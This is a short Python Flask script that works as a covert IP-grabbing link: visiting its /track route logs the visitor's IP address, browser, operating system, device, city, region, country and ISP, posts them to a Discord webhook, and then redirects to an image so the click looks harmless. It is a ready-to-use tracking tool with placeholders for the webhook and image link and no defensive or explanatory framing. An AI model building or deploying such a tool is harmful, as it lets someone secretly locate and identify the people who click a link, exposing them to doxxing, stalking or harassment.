from flask import Flask, request, redirect
import requests
from user_agents import parse

# Initialize Flask app
app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/XXX/YYY"  # Your webhook URL here

@app.route('/track')
def track():
    ip = request.remote_addr or 'unknown'
    user_agent_string = request.headers.get('User-Agent', 'unknown')
    
    # Parse the user-agent string
    user_agent = parse(user_agent_string)

    # Extract specific details from the parsed user agent
    browser = user_agent.browser.family  # e.g., Chrome, Firefox
    os = user_agent.os.family  # e.g., Windows, macOS
    device = user_agent.device.family  # e.g., Desktop, Mobile

    # Get geo info (use ipinfo.io or any other service)
    geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
    city = geo.get("city", "Unknown")
    region = geo.get("region", "Unknown")
    country = geo.get("country", "Unknown")
    org = geo.get("org", "Unknown")

    # Build message
    content = (
        f"👀 Click detected!\n"
        f"🌍 IP: `{ip}`\n"
        f"📍 Location: {city}, {region}, {country}\n"
        f"🏢 ISP: {org}\n"
        f"🖥️ User-Agent: {browser} on {os} ({device})"
    )

    # Send to Discord
    requests.post(WEBHOOK_URL, json={"content": content})

    # Redirect to your image link
    return redirect("https://your-image-link.com")

if __name__ == "__main__":
    app.run(port=5000)
